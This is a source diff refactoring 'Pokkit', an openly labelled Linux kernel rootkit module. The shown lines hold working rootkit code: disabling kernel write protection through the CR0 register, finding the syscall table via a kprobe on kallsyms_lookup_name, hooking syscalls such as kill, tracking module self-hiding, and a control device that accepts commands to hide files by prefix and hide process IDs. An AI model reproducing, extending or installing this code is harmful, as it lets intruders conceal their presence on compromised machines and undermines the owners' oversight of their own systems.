@@ -3,19 +3,16 @@
 #include <linux/kernel.h> // types, macros, functions for kernel
 #include <linux/kallsyms.h> // functions for kallsyms actions
 #include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
-#include <linux/version.h> // get kernel versions
-#include <linux/kprobes.h> // to probe kernel dymbols
 #include <asm/paravirt.h>
 #include <linux/dirent.h> // dirent
 #include <linux/slab.h>
 #include <linux/cred.h> // credentials
 #include <linux/syscalls.h>
 #include <linux/uaccess.h> // copy to/from user space
-#include <linux/fs.h>
-#include <linux/miscdevice.h> // dev
 #include <linux/reboot.h> // reboot function
 #include <linux/sched.h>
-
+#include "kite_hook.h"
+#include "device_handler.h"
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Pokkit");
@@ -23,59 +20,12 @@ MODULE_AUTHOR("NondairyDig");
 MODULE_VERSION("0.3");
 
 
-#define DEVICE_SIZE 512 // size of possible input in bytes
-char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace
-char hide_pid[NAME_MAX]; // pid to hide
-char PREFIX[DEVICE_SIZE] = "asdfasdfasdfasdfasdf"; // filename prefix to hide
-
-
-#ifdef CONFIG_X86_64 /* check if system is 64bit*/
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) /*check if kernel version uses ptregs_t type for system calls*/
-#define PTREGS_SYSCALL_STUB 1 /*signal 64bit*/
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions*/
 const int ACTIVE_HOOKS_SIZE = 4; /*Available number of hooks to store*/
-typedef struct HOOK {
-    int call;
-    void * f_ptr;
-    ptregs_t original;
-} HOOK; /*defiine structure to keep hooks by syscall, pointer to new function, pointer to original function*/
-#else
-typedef asmlinkage long (*syscall_old_t)(pid_t pid, int sig); ////change!!!
-syscall_old_t orig_kill;
-typedef struct HOOK {
-    int call;
-    void * f_ptr;
-    void * original;
-} HOOK;
-#endif
-#endif
-
 
 static int hidden = 0; // flag if module is hidden
 static struct list_head *prev_module;
 unsigned long *__SYS_CALL_TABLE; // variable for a pointer to the syscall table
 static HOOK *ACTIVE_HOOKS; // HOOKs array
-
-
-static inline void flip_cr0_force(unsigned long val){ //method to change cr0 register to un/protect the kernel memory
-    unsigned long __force_order;
-
-    asm volatile(
-        "mov %0, %%cr0"
-        : "+r"(val), "+m"(__force_order));
-}
-
-
-static void unprotect_memory(void){
-    flip_cr0_force(read_cr0() & (~ 0x10000)); // &'ing to set the 6th bit in the register and reversing it to 0 to unprotect the memory
-    printk(KERN_INFO "unprotected memory\n");
-}
-
-
-static void protect_memory(void){
-    flip_cr0_force(read_cr0() | (0x10000)); // |'ing to set the 6th bit in the register to 1 unprotect the memory
-    printk(KERN_INFO "protected memory\n");
-}
 
 
 static int hook(int sysc, void *f_ptr){
@@ -263,27 +213,6 @@ static int store_syscall(int sysc, int i){
 }
 
 
-static unsigned long *get_syscall_table(void){
-    static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name" // ready the kbrobe to probe the kallsyms_lookup_name function
-    };
-
-    typedef unsigned long (*t_kallsyms_lookup_name)(const char *); // the kallsyms_lookup_name function prototype
-    unsigned long *syscall_old_table; // define syscall table pointer to return later
-    #if LINUX_VERSION_CODE > KERNEL_VERSION(5, 8, 0)
-        register_kprobe(&kp);
-        t_kallsyms_lookup_name kallsyms_lookup_name_new;
-        kallsyms_lookup_name_new = (t_kallsyms_lookup_name)kp.addr; // get address of function
-        syscall_old_table = (unsigned long*)kallsyms_lookup_name_new("sys_call_table"); // get starting point of syscall table in memory
-        unregister_kprobe(&kp);
-    #elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0) && LINUX_VERSION_CODE < KERNEL_VERSION(5, 8, 0)
-        syscall_old_table = (unsigned long*)kallsyms_lookup_name("sys_call_table"); // find syscall table symlink and get table address
-    #else
-        syscall_old_table = NULL;
-    #endif
-    return syscall_old_table;
-}
-
 
 static int cleanup(void){
     int i = 0;
@@ -296,40 +225,6 @@ static int cleanup(void){
     }
     protect_memory();
     kfree(ACTIVE_HOOKS);// free hooks array
-    return 0;
-}
-
-
-ssize_t reader(struct file *filep,char *buff,size_t count,loff_t *offp)
-{
-    if (copy_to_user(buff, last_data, strlen(last_data)) != 0) { // copy last written data to user using the device
-        printk("Kernel -> userspace copy failed!\n");
-        return -1; // return error
-    }
-    return strlen(last_data); // return length of data that was copied
-}
-
-
-ssize_t writer(struct file *filep,const char *buff,size_t count,loff_t *offp) // function to get config of what to hide and what type
-{
-    char tmpdata[DEVICE_SIZE + 1];
-    if (copy_from_user(tmpdata, buff, count) != 0) {
-        printk("Userspace -> kernel copy failed!\n");
-        return -1;
-    }
-    if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
-        if(strlen(tmpdata) > strlen("hide ") + 3){
-            strcpy(last_data, tmpdata + strlen("hide "));
-            strcpy(PREFIX, last_data);
-        }
-    }
-    if(memcmp("hidep ", tmpdata, strlen("hidep ")) == 0){
-        if(strlen(tmpdata) > strlen("hidep ")){
-            strcpy(last_data, tmpdata + strlen("hidep "));
-            strcpy(hide_pid, last_data);
-        }
-    }
-    printk(KERN_INFO "%s", last_data);
     return 0;
 }
 
@@ -431,22 +326,13 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
 #endif
 
 
-struct file_operations fops = { // file operations on device file, what functions to call when reading/writing
-    read: reader,
-    write: writer
-};
 
-static struct miscdevice controller = { // device configuration in file system and kernel
-    .minor = MISC_DYNAMIC_MINOR,
-    .name = "controller",
-    .fops = &fops
-};
 
 
 static int __init mod_init(void){
     printk(KERN_INFO "Activated pookkit, Initializing & Hooking Kill\n");
     misc_register(&controller); // register the device for interaction within filesystem
-    __SYS_CALL_TABLE = get_syscall_table(); // get the syscall table
+    __SYS_CALL_TABLE = get_symbol("sys_call_table"); // get the syscall table
     ACTIVE_HOOKS = kzalloc(sizeof(HOOK)*ACTIVE_HOOKS_SIZE, GFP_KERNEL); // allocate memory to the number hooks as the number of capabilities
     if (!__SYS_CALL_TABLE){
         printk(KERN_ERR "Error: SYSCALL Table can't be found\n");
